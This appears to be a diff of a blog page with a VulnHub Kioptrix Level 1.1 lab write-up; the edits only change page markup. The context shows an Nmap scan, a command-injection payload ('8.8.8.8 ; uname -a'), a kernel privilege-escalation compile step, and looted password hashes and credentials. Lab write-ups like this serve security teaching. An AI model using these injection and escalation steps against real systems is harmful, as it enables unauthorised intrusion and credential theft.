@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190928_vulnhub-kioptrix1.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190929_vulnhub-kioptrix3.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix2/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix2/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.0.52 ((CentOS))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_cmdexec">exploit_cmdexec</a>, <a href="https://github.com/7h3rAm/writeups#privesc_kernel_ipappend">privesc_kernel_ipappend</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Sep 27 18:16:48 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix2/results/192.168.92.182/scans/xml/_quick_tcp_nmap.xml 192.168.92.182
 Nmap scan report for 192.168.92.182
@@ -150,7 +150,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 631/tcp   |  ipp       |  CUPS 1.1
 3306/tcp  |  mysql     |  MySQL (unauthorized)
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We try to inject additional command after the IP using a <code>;</code> as separator and get results back:  </p>
 <pre class="nested"><code>8.8.8.8 ; uname -a
 </code></pre>
@@ -168,7 +168,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot09.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot10.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.3.3" src="/static/files/posts_vulnhub_kioptrix2/screenshot11.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>apache@kioptrix.level2&gt; id
 uid=48(apache) gid=48(apache) groups=48(apache)
 apache@kioptrix.level2&gt;  
@@ -189,7 +189,7 @@ apache@kioptrix.level2&gt;
 apache@kioptrix.level2&gt; users
 root
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We try the usuals (<code>crontab</code>|<code>setuid</code>|<code>chkrootkit</code>|etc.) but do not find anything interesting. While exploring the current directory, we find that <code>/var/www/html/index.php</code> file has hardcoded MySQL credentials for user <code>john</code>:  </p>
 <pre class="nested"><code>head /var/www/html/index.php
   mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());
@@ -222,7 +222,7 @@ gcc -o 9542 9542.c
 <p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_kioptrix2/screenshot16.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_kioptrix2/screenshot17.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.5.3" src="/static/files/posts_vulnhub_kioptrix2/screenshot18.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:............
 john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:............
@@ -232,7 +232,7 @@ harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:............
 <pre class="nested"><code>mysql: john/hirosh...
 webapp: admin/5afac8...., john/66lajGG...
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a>  </li>
 <li><a href="https://byte8blog.wordpress.com/2017/03/18/kioptrix-level-2-writeup/">https://byte8blog.wordpress.com/2017/03/18/kioptrix-level-2-writeup/</a>  </li>
